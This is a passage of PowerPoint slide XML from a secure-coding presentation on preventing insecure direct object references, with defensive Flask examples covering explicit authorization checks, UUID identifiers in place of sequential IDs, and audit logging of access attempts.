            <a:off x="7662982" y="2242661"/>
            <a:ext cx="4065627" cy="372070"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2900"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RIGHT:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> Explicit authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="2869882"/>
            <a:ext cx="6117788" cy="3243263"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2937"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7651671" y="2869882"/>
            <a:ext cx="6140410" cy="3243263"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1049"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D8BCA"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7878485" y="3039904"/>
            <a:ext cx="5686782" cy="2903220"/>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highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>@app.route('/api/profile/')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>def get_profile(user_id):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    # Verify authorization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    if user_id != current_user.id and not current_user.is_admin:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>        abort(403)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    user = User.query.get(user_id)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="0D8BCA"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>    return jsonify(user.to_dict())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="6368296"/>
            <a:ext cx="6117788" cy="725805"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Always verify that the current user has permission to access the requested resource.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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3787" y="825937"/>
            <a:ext cx="10221635" cy="725448"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="5700"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4550" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>3. Use UUIDs Instead of Sequential IDs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4550" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="773787" y="1982391"/>
            <a:ext cx="6433661" cy="2683788"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3460"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1002387" y="2210991"/>
            <a:ext cx="5846921" cy="362664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>WRONG: Sequential IDs (easy to enumerate)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1002387" y="2816066"/>
            <a:ext cx="5976461" cy="680680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13642"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="991433" y="2816066"/>
            <a:ext cx="5998369" cy="680680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4872"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1212413" y="2981801"/>
            <a:ext cx="5556409" cy="349210"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>user_id = 1, 2, 3, 4, 5...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1002387" y="3739158"/>
            <a:ext cx="5976461" cy="698421"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Sequential IDs make it trivial for attackers to enumerate all users in your system.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7422952" y="1982391"/>
            <a:ext cx="6433661" cy="2683788"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3460"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CCEEFF"/>
          </a:solidFill>
          <a:ln w="7620">
            <a:solidFill>
              <a:srgbClr val="B2D4E5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7651552" y="2210991"/>
            <a:ext cx="4766191" cy="362664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RIGHT: UUIDs (impossible to guess)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7651552" y="2816066"/>
            <a:ext cx="5976461" cy="680680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13642"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7640598" y="2816066"/>
            <a:ext cx="5998369" cy="680680"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4872"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7861578" y="2981801"/>
            <a:ext cx="5556409" cy="349210"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>user_id = "550e8400-e29b-41d4-a716-446655440000"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7651552" y="3739158"/>
            <a:ext cx="5976461" cy="698421"/>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Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>UUIDs are cryptographically random and cannot be predicted or enumerated.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="773787" y="4989433"/>
            <a:ext cx="2901791" cy="362664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Implementation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="773787" y="5675352"/>
            <a:ext cx="13082826" cy="1728311"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5373"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="762833" y="5675352"/>
            <a:ext cx="13104733" cy="1728311"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1919"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="983813" y="5841087"/>
            <a:ext cx="12662773" cy="1396841"/>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highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>from uuid import uuid4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>class User(db.Model):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2F2F2"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid4()))</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02449" y="552807"/>
            <a:ext cx="3781187"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Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>4. Implement Audit Logging</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1038225"/>
            <a:ext cx="7825502" cy="136088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1050"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="850" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="272525"/>
                </a:solidFill>
                <a:latin typeface="Inter" pitchFamily="34" charset="0"/>
                <a:ea typeface="Inter" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Inter" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Log all access attempts to track and alert on suspicious activity:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="1238012"/>
            <a:ext cx="7825502" cy="2347436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2029"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3396853" y="1238012"/>
            <a:ext cx="7836694" cy="2347436"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 725"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2F2F2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3510201" y="1323023"/>
            <a:ext cx="7609999" cy="2177415"/>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Log all access attempts</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def log_access(user_id, resource_id, action, allowed):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log_entry =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'timestamp': datetime.now(),</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'user_id': user_id,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'resource_id': resource_id,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'action': action,</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'allowed': allowed,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'ip_address': request.remote_addr,</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'user_agent': request.user_agent</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AuditLog.create(**log_entry)</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 Alert on suspicious activity</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if not allowed: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send_security_alert(f"Unauthorized access attempt: {log_entry}")</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="850" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3402449" y="3670459"/>
            <a:ext cx="1488519" cy="185976"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Petrona Bold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Petrona Bold" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Petrona Bold" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Usage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
